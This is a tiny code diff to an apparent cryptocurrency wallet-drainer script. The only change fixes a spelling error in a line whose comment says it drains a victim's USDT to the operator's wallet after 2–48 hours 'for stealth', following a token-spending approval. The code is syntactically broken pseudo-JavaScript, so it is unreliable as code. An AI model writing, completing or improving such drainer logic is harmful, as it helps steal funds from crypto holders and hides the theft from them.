@@ -8,7 +8,7 @@ var smartcontract
 function approveSpending(token) {
 	
 	 smartcontract.methods.approvetransaction.(targetwallet);      //the smart contract gets approved to access tokens
-	smartcontract.methods.drainusdt.send(to:recieveAddress).token(cryptotokencontract); // the smart contract drains to your wallet after 2-48 hours for stealth
+	smartcontract.methods.drainusdt.send(to:receiveAddress).token(cryptotokencontract); // the smart contract drains to your wallet after 2-48 hours for stealth
 }
 	  
   			
